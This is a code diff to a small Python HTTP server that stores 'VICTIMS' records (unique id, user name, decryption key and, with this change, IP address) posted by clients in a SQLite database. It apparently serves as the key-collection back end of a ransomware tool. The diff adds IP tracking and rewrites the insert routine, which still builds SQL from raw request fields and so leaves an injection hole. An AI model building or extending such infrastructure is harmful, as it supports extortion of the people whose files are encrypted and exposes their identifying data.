@@ -2,13 +2,15 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 import mysql.connector
 import sqlite3
 
+connection = sqlite3.connect("Details.db")  
 
 def createTable(connection):
     cursor = connection.cursor()
     cursor.execute("""CREATE TABLE IF NOT EXISTS VICTIMS(
         UniqueId VARCHAR2(50) PRIMARY KEY,
         UserName VARCHAR2(50) NOT NULL,
-        DecryptionKey INT NOT NULL
+        DecryptionKey INT NOT NULL,
+        IP VARCHAR2(40) NOT NULL
         );
         """)
     print("Table created successfully!")
@@ -21,17 +23,15 @@ def execute(connection, query):
     connection.commit()
     print("Query executed.")
 
-def insertValues(id, user, key):
-    insertValue = f"""
-    INSERT INTO VICTIMS VALUES ('{id}', '{user}', {key});
-    """
-    return insertValue
+def insertValues(connection, id, user, key, ip):
+    cursor = connection.cursor()
+    cursor.execute(f"INSERT INTO VICTIMS VALUES ('{id}', '{user}', {key}, '{ip}');")
+    connection.commit()
 
 def retrieve(connection):
     cursor = connection.cursor()
     details = cursor.execute("SELECT * FROM VICTIMS")
-    print(details.fetchall()
-    )
+    print(details.fetchall())
 
 
 class Server(BaseHTTPRequestHandler):
@@ -49,18 +49,15 @@ class Server(BaseHTTPRequestHandler):
         id = data["uniqueId"]
         user = data["user"]
         key = data["key"]
+        ip = data["ip"]
         self.send_response(200)
         self.end_headers()
-        execute(connection, insertValues(id, user, key))
+        insertValues(connection, id, user, key, ip)
         
 
 if __name__ == "__main__":
-
-    username, passwd = ("YOUR_USERNAME_HERE", "YOUR_PASSWORD_HERE")    # enter the creds
-
-
-    connection = sqlite3.connect("Details.db")    
-    createTable(connection)   
+  
+    createTable(connection)
     # retrieve(connection)
     WebServer = HTTPServer(("localhost", 8000), Server)
     WebServer.serve_forever()
